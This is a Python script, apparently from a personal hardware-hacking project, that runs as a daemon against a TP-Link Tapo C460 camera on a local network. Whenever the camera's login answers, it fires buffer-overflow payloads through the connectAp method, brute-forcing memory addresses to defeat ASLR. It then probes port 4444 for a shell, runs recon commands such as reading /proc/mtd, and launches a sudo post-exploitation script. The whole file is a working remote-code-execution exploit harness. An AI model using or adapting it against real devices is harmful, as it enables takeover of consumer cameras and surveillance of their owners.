#!/opt/homebrew/bin/python3
"""C460 continuous burst daemon: single process, endless login-poll loop.
On DS-up: fires up to 12 addresses back-to-back, in-band shell grab,
auto-postshell. On shell: exits 0 (systemd/launchd KeepAlive restarts it
fresh for the next boot's ASLR). Heartbeats every 20 tries."""
import sys, time, json, struct, base64, socket, subprocess, os

sys.path.insert(0, "/Users/jemanuel/projects/franken_surveillance_system/deliverables/scripts")
os.chdir("/Users/jemanuel/projects/franken_surveillance_system")
import tapo_connectap_sc as T

HOST = "192.168.4.33"
MAC = "50:3D:D1:E3:E2:07"
BASE = 0xbef80000
STEP = 0x400
LOG = "/tmp/c460_incremental_sweep.log"
STATE = "/tmp/c460_sweep_incremental.idx"

def log(m):
    with open(LOG, "a") as f:
        f.write(time.strftime("%H:%M:%S ") + m + "\n")

def login_once():
    r = T.post(HOST, "/", {"method": "login", "params": {"cnonce": "", "encrypt_type": "3", "username": "admin"}}, timeout=3)
    try:
        j = json.loads(r)
        if "stok" in j:
            return j["stok"]
    except Exception:
        pass
    return None

def grab_and_postshell():
    log("SHELL — in-band recon grab")
    try:
        s = socket.create_connection((HOST, 4444), timeout=5)
        s.settimeout(4)
        out = b""
        for c in (b"id\n", b"cat /proc/mtd\n", b"cat /proc/version\n"):
            s.sendall(c); time.sleep(1.5)
            try:
                while True:
                    d = s.recv(4096)
                    if not d: break
                    out += d
            except socket.timeout:
                pass
        s.close()
        os.makedirs(f"/tmp/pane1/{HOST}", exist_ok=True)
        with open(f"/tmp/pane1/{HOST}/recon_sweep.txt", "wb") as f:
            f.write(out)
        log(f"recon {len(out)}B saved")
    except Exception as e:
        log(f"grab err: {e}")
    subprocess.run(["sudo","-n","bash","deliverables/scripts/c460_postshell.sh",HOST], capture_output=True, timeout=180)
    log("postshell dispatched")

def main():
    if os.path.exists(STATE):
        idx = int(open(STATE).read().strip() or 0)
    else:
        idx = 0
    log(f"daemon start at index {idx}")
    tries = 0
    while True:
        stok = login_once()
        tries += 1
        if stok:
            log(f"DS UP (try {tries}) — disabling sleep + bursting from index {idx}")
            # disable sleep mode first (keeps camera awake for future attempts)
            subprocess.run(["bash", "deliverables/scripts/disable_tapo_sleep.sh", HOST],
                           capture_output=True, timeout=30)
            sess = {"stok": stok}
            fired = 0
            while fired < 12:
                addr = BASE + idx * STEP
                b64 = T.build(1060, None, addr, sled=0, padpc=1, prefix=b"", bare=False, hang=True)
                body = {"method": "connectAp", "params": T.connect_params(b64, "Aardvark", "00:00:00:00:00:00")}
                try:
                    T.req(HOST, sess, body, timeout=8)
                    log(f"{addr:#x} fired")
                except Exception as e:
                    log(f"{addr:#x} exc {e}")
                # cheap shell probe between shots
                try:
                    s = socket.create_connection((HOST, 4444), timeout=1.5)
                    s.close()
                    log(f"SHELL at {addr:#x}")
                    grab_and_postshell()
                    with open(STATE, "w") as f: f.write(str(idx))
                    print(json.dumps({"result": "shell", "addr": hex(addr)}))
                    return
                except Exception:
                    pass
                with open(STATE, "w") as f: f.write(str(idx))
                idx += 1
                fired += 1
            log("burst done (12) — back to polling")
            tries = 0
        else:
            if tries % 20 == 0:
                log(f"login wait: try {tries}, DS closed")
            time.sleep(1)

if __name__ == "__main__":
    main()
